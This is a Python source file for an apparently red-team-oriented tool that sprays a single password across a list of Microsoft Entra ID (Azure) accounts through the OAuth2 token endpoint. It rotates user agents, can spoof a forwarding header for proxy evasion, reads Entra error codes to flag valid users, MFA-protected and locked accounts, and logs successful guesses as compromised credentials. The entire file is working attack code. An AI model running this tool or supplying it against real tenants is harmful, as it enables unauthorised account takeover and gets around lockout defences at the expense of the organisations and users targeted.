import argparse
import requests
import time
from datetime import datetime
from colorama import Fore, Style
import random
import sys
import os
import shutil


def log_message(message, full_log, compromised_users_log=None, color=None):
    timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")

    if color:
        print(f"[{timestamp}] {color}{message}{Style.RESET_ALL}")
    else:
        print(f"[{timestamp}] {message}")

    full_log.write(f"[{timestamp}] {message}\n")

    if compromised_users_log:
        compromised_users_log.write(f"[{timestamp}] {message}\n")


def check_file(file_path, file):
    try:
        with open(file_path) as f:
            if not any(line.strip() for line in f):
                raise ValueError(f"{file} file is empty.")
    except FileNotFoundError:
        print(f"{file} file '{file_path}' not found.")
        sys.exit(1)
    except ValueError as e:
        print(str(e))
        sys.exit(1)


def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Perform password spraying against Microsoft Azure accounts.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Example Usage:\n\n"
        "python entraspray.py -u userlist.txt -p Password123\n",
    )
    parser.add_argument(
        "-u",
        "--userlist",
        required=True,
        help="Path to a file containing usernames one-per-line in the format 'user@example.com'",
    )
    parser.add_argument(
        "-p",
        "--password",
        required=True,
        help="Password to be used for the password spraying.",
    )
    parser.add_argument(
        "--url",
        default="https://login.microsoft.com",
        help="URL to spray against.",
    )
    parser.add_argument(
        "-d",
        "--delay",
        type=int,
        default=0,
        help="Number of seconds to delay between requests.",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        default=False,
        action="store_true",
        help="Show invalid password attempts.",
    )
    parser.add_argument(
        "-f",
        "--force",
        default=False,
        action="store_true",
        help="Force the spray to continue even if multiple account lockouts are detected.",
    )
    parser.add_argument(
        "--debug",
        default=False,
        action="store_true",
        help="For debugging - Show web request and response.",
    )

    return parser.parse_args()


def entra_spray(
    url, user_list_file, password, delay, user_agents_file, force, verbose, debug
):
    usernames = [line.strip() for line in open(user_list_file)]
    user_agents = [line.strip() for line in open(user_agents_file)]
    count = len(usernames)
    lockout_count = 0
    lockoutquestion = 0
    compromised_users = []

    output_directory = datetime.now().strftime("output/%d-%m-%Y_%H:%M:%S")
    create_directory(output_directory)

    # backup original userlist input file
    user_list_file_backup = os.path.join(
        output_directory, os.path.basename(user_list_file) + ".bak"
    )
    shutil.copyfile(user_list_file, user_list_file_backup)

    full_log_filename = os.path.join(output_directory, "full.log")
    compromised_users_log_filename = os.path.join(
        output_directory, "compromised_users.log"
    )

    with open(full_log_filename, "w") as full_log, open(
        compromised_users_log_filename, "w"
    ) as compromised_user_log:
        log_message(
            f"[*] There are {count} total users to spray.",
            full_log,
        )
        log_message(
            f"[*] Now spraying Microsoft Online.",
            full_log,
        )
        non_compromised_users = []
        for username in usernames:

            if delay:
                sleep_time = delay
                time.sleep(sleep_time)

            user_agent = random.choice(user_agents)

            body_params = {
                "resource": "https://graph.windows.net",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
                "client_info": "1",
                "grant_type": "password",
                "username": username,
                "password": password,
                "scope": "openid",
            }
            post_headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": user_agent,
            }

            if debug:
                log_message("[*] Request Details:", full_log)
                log_message(f"[*] URL: {url}", full_log)
                log_message(f"[*] Headers: {post_headers}", full_log)
                log_message(f"[*] Data: {body_params}", full_log)

            # Add "X-My-X-Forwarded-For" header for Firprox (if "microsoft" is not in the url value)
            r = requests.post(
                f"{url}/common/oauth2/token",
                headers={
                    **post_headers,
                    **(
                        {"X-My-X-Forwarded-For": "127.0.0.1"}
                        if "microsoft" not in url
                        else {}
                    ),
                },
                data=body_params,
            )

            if debug:
                log_message("[*] Response Details:", full_log)
                log_message(f"[*] Status Code: {r.status_code}", full_log)
                log_message(f"[*] Headers: {r.headers}", full_log)
                log_message(f"[*] Body: {r.text}", full_log)

            if r.status_code == 200:
                log_message(
                    f"[+] {username} : {password}",
                    full_log,
                    compromised_users_log=compromised_user_log,
                    color=Fore.GREEN,
                )
                compromised_users.append(f"{username} : {password}")
            else:
                # Check for error codes in response
                # List of Entra ID error codes - https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes
                resp_err = r.text
                if "AADSTS50126" in resp_err:
                    # Standard invalid password
                    non_compromised_users.append(username)
                    if verbose or debug:
                        log_message(
                            f"[*] Valid user, but invalid password {username} : {password}",
                            full_log,
                            color=Fore.YELLOW,
                        )
                elif "AADSTS50055" in resp_err:
                    # User password is expired
                    compromised_users.append(f"{username} : {password}")
                    log_message(
                        f"[+] {username} : {password} - NOTE: The user's password is expired.",
                        full_log,
                        compromised_users_log=compromised_user_log,
                        color=Fore.GREEN,
                    )
                elif "AADSTS50079" in resp_err or "AADSTS50076" in resp_err:
                    # Microsoft MFA response
                    compromised_users.append(f"{username} : {password}")
                    log_message(
                        f"[+] {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.",
                        full_log,
                        compromised_users_log=compromised_user_log,
                        color=Fore.GREEN,
                    )
                elif "AADSTS50158" in resp_err:
                    # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
                    compromised_users.append(f"{username} : {password}")
                    log_message(
                        f"[+] {username} : {password} - NOTE: Conditional access policy (MFA: DUO or other) is in use.",
                        compromised_user_log,
                        color=Fore.GREEN,
                    )
                elif "AADSTS53003" in resp_err:
                    # Conditional Access response - access policy blocks token issuance
                    compromised_users.append(f"{username} : {password}")
                    log_message(
                        f"[+] {username} : {password} - NOTE: Conditional access policy is in place and blocks token issuance.",
                        compromised_user_log,
                        color=Fore.GREEN,
                    )
                elif "AADSTS53000" in resp_err:
                    # Conditional Access response - access policy requires a compliant device
                    compromised_users.append(f"{username} : {password}")
                    log_message(
                        f"[+] {username} : {password} - NOTE: Conditional access policy is in place and requires a compliant device, and the device isn't compliant.",
                        compromised_user_log,
                        color=Fore.GREEN,
                    )
                elif "AADSTS530035" in resp_err:
                    # Access block by security defaults
                    compromised_users.append(f"{username} : {password}")
                    log_message(
                        f"[+] {username} : {password} - NOTE: Access has been blocked by security defaults. The request is deemed unsafe by security defaults policies",
                        compromised_user_log,
                        color=Fore.GREEN,
                    )
                elif "AADSTS50128" in resp_err or "AADSTS50059" in resp_err:
                    # Invalid Tenant Response
                    non_compromised_users.append(username)
                    log_message(
                        f"[-] Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.",
                        full_log,
                        color=Fore.YELLOW,
                    )
                elif "AADSTS50034" in resp_err:
                    # Invalid Username
                    non_compromised_users.append(username)
                    log_message(
                        f"[-] The user {username} doesn't exist.",
                        full_log,
                        color=Fore.YELLOW,
                    )

                elif "AADSTS50053" in resp_err:
                    # Locked out account or Smart Lockout in place
                    non_compromised_users.append(username)
                    log_message(
                        f"[!] The account {username} appears to be locked.",
                        full_log,
                        color=Fore.RED,
                    )
                    lockout_count += 1
                elif "AADSTS50057" in resp_err:
                    # Disabled account
                    non_compromised_users.append(username)
                    log_message(
                        f"[!] The account {username} appears to be disabled.",
                        full_log,
                        color=Fore.YELLOW,
                    )
                else:
                    # Unknown errors
                    non_compromised_users.append(username)
                    log_message(
                        f"[*] Got an error we haven't seen yet for user {username}",
                        full_log,
                    )
                    log_message(resp_err, full_log)

            # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
            if not force and lockout_count == 10 and lockoutquestion == 0:
                log_message(
                    "[!] Multiple Account Lockouts Detected!",
                    full_log,
                    color=Fore.RED,
                )
                log_message(
                    "[!] 10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?",
                    full_log,
                    color=Fore.RED,
                )
                result = input("[*] Press 'Y' to continue, any other key to cancel: ")
                log_message(f"[*] User response: {result}", full_log)
                lockoutquestion += 1
                if result.lower() != "y":
                    log_message("[*] Cancelling the password spray.", full_log)
                    log_message(
                        "[*] NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.",
                        full_log,
                    )
                    break

        # Write remaining usernames back to the original user list file
        with open(user_list_file, "w") as non_compromised_users_file:
            for username in non_compromised_users:
                non_compromised_users_file.write(f"{username}\n")

        if len(compromised_users) > 0:
            log_message(
                f"[*] {len(compromised_users)} compromised users have been written to {compromised_users_log_filename} and removed from {user_list_file}.",
                full_log,
            )
        else:
            log_message("[*] No users compromised.", full_log)


def main():
    args = parse_arguments()
    # Check if the user list file is empty or not found
    check_file(args.userlist, "User list")
    # Check if the user agents file is empty or not found
    user_agents_file = "user-agents.txt"
    check_file(user_agents_file, "User agents")

    entra_spray(
        args.url,
        args.userlist,
        args.password,
        args.delay,
        user_agents_file,
        args.force,
        args.verbose,
        args.debug,
    )


if __name__ == "__main__":
    main()
